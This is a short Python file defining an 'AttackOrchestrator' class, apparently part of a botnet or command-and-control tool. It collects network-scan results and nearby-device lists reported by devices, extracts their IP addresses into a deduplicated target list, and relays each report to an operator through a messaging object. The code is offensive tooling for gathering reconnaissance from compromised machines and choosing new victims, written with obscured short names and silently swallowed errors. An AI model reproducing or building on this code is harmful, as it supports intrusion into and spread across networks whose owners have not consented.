#!/usr/bin/env python3
import logging
import json
import random

class AttackOrchestrator:
    def __init__(self,c,m):
        self.c=c
        self.m=m
        self.t=[]
    def pn(self,d,sc):
        logging.info(f"ns from {d}: {sc}")
        if sc and len(sc)>10:
            try:
                for s in sc.split('\n'):
                    if ':' in s:
                        ip=s.split()[0]
                        self.t.append(ip)
            except: pass
        self.m.send_message_to_admin(f"NS:{d}\n{sc[:200]}")
    def process_network_scan(self,d,sc):
        self.pn(d,sc)
    def process_nearby_devices(self,d,nd):
        logging.info(f"nd from {d}: {nd}")
        if nd and len(nd)>5:
            try:
                ndj=json.loads(nd) if isinstance(nd,str) else nd
                for dev in ndj:
                    if 'ip' in dev:
                        ip=dev['ip']
                        self.t.append(ip)
            except: pass
        self.m.send_message_to_admin(f"ND:{d}\n{nd[:200]}")
    def get_targets(self):
        return list(set(self.t))
    def clear_targets(self):
        self.t=[]